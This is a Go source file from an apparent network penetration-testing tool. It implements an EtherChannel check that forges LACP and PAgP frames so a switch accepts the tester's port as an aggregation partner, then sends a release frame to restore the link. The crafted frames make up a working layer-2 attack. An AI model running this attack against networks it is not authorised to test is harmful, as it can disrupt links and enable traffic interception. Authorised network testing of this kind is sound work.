// etherchannel.go implements the EtherChannel (LACP/PAgP) check. Impact
// temporary, restore active, affects device: the LACP and PAgP frames
// offer the switch a link aggregation partner, and the armed port-channel
// release step sends an LACPDU whose actor state carries no
// Synchronization, Collecting, or Distributing bit, the departure of a
// port from the aggregation. What the partner does with it is unverified
// against IEEE 802.1AX, which is not vendored.
//
// The baseline (l2l3-audit) does not carry an EtherChannel attack. The
// LACP/PAgP craft is authored from IEEE 802.1AX and Cisco/Wireshark specs.

package l2

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"net"

	"go.aledante.io/FlowSeer/src/common/errs"

	"go.aledante.io/FlowSeer/src/edge/netpen/check"
	"go.aledante.io/FlowSeer/src/edge/netpen/layers"
)

type etherChannelFinding struct {
	Action    string   `json:"action"`
	Protocols []string `json:"protocols"`
	Restore   string   `json:"restore"`
}

// RunEtherChannel sends one LACPDU and one PAgP hello from the attack leg's
// MAC and reads the attack leg for the switch's answer. It reads no
// target: the keys, ports, and partner identity are probe content. It
// arms the port-channel release before the first frame. The predicate is
// an LACPDU from another sender whose partner system is the attack leg's
// MAC with the Synchronization bit set, or a PAgP frame whose partner
// device id is the attack leg's MAC, either of which confirms; an LACPDU
// naming another partner at the window's end resists; silence resists,
// since a switch running either protocol on the port would have spoken.
func RunEtherChannel(ctx context.Context, deps check.Deps) (check.Verdict, error) {
	src := deps.AttackLeg.Addr().MAC

	releasePkt, err := craftLACPDU(src, 0)
	if err != nil {
		return check.Verdict{}, errs.Wrap(err, "etherchannel: craft release")
	}
	deps.Teardown.Arm("port-channel-release", func(ctx context.Context) error {
		return deps.AttackLeg.Send(ctx, releasePkt)
	})

	lacpPkt, err := craftLACPDU(src, layers.LACPStateAggregation|layers.LACPStateSynchronization|layers.LACPStateCollecting|layers.LACPStateDistributing)
	if err != nil {
		return check.Verdict{}, errs.Wrap(err, "etherchannel: craft LACP")
	}
	if err := deps.AttackLeg.Send(ctx, lacpPkt); err != nil {
		return check.Verdict{}, errs.Wrap(err, "etherchannel: send LACP")
	}

	pagpPkt, err := craftPAgPHello(src)
	if err != nil {
		return check.Verdict{}, errs.Wrap(err, "etherchannel: craft PAgP")
	}
	if err := deps.AttackLeg.Send(ctx, pagpPkt); err != nil {
		return check.Verdict{}, errs.Wrap(err, "etherchannel: send PAgP")
	}

	detail, _ := json.Marshal(etherChannelFinding{
		Action:    "etherchannel-manipulation",
		Protocols: []string{"lacp", "pagp"},
		Restore:   "yes",
	})
	deps.Emitter.Finding("lacp", detail)

	var otherPartner net.HardwareAddr
	var confirmed string
	found, obs, err := check.First(ctx, deps.AttackLeg, deps.Observe, func(data []byte) bool {
		if lacp, ok := isLACPFrom(data, src); ok {
			if bytes.Equal(lacp.Partner.System, src) && lacp.Partner.State&layers.LACPStateSynchronization != 0 {
				confirmed = "an LACPDU from the switch names the attack leg as its synchronized partner"
				return true
			}
			otherPartner = lacp.Partner.System
			return false
		}
		if pagp, ok := isPAgPFrom(data, src); ok && bytes.Equal(pagp.PartnerDeviceID, src) {
			confirmed = "a PAgP frame from the switch names the attack leg as its partner"
			return true
		}
		return false
	})
	if err != nil {
		if ctx.Err() != nil {
			return check.Verdict{}, ctx.Err()
		}
		return check.Verdict{}, errs.Wrap(err, "etherchannel: receive")
	}
	switch {
	case found != nil:
		return check.Confirmed(confirmed, obs.Elapsed), nil
	case otherPartner != nil:
		return check.Resisted(fmt.Sprintf("the switch names partner %s", otherPartner), obs.Elapsed), nil
	}
	return check.Resisted(fmt.Sprintf("no LACP or PAgP from the switch in %s", obs.Elapsed), obs.Elapsed), nil
}

// craftLACPDU builds an LACPDU with the given actor state: the probe
// advertises aggregation, synchronization, collecting, and distributing
// (0x3C), and the release carries none of them.
func craftLACPDU(src net.HardwareAddr, state layers.LACPActorState) ([]byte, error) {
	lacp := &layers.LACP{
		Subtype: 0x01,
		Version: 0x01,
		Actor: layers.LACPPortInfo{
			SystemPriority: 0x8000,
			System:         src,
			Key:            0x0001,
			PortPriority:   0x8000,
			Port:           0x0001,
			State:          state,
		},
		Partner: layers.LACPPortInfo{
			SystemPriority: 0x8000,
			System:         partnerMAC,
			Key:            0x0002,
			PortPriority:   0x8000,
			Port:           0x0002,
			State:          0,
		},
		CollectorMaxDelay: 0x8000,
	}
	return craftEtherType(lacpDstMAC, src, ethertypeLACP, lacp)
}

// craftPAgPHello builds a PAgP hello command frame, matching the fixture.
func craftPAgPHello(src net.HardwareAddr) ([]byte, error) {
	pagp := &layers.PAgP{
		Version:         0x01,
		Command:         layers.PAGPCmdHello,
		GroupCapability: 0x01,
		GroupNumber:     0x01,
		LocalDeviceID:   src,
		LocalPortID:     0x00000001,
		LocalIfIndex:    0x00000001,
		PartnerDeviceID: partnerMAC,
		PartnerPortID:   0x00000002,
		PartnerIfIndex:  0x00000002,
		PartnerGroupCap: 0x01,
	}
	return craftDot3SNAP(pagpDstMAC, src, snapPIDPAgP, pagp)
}
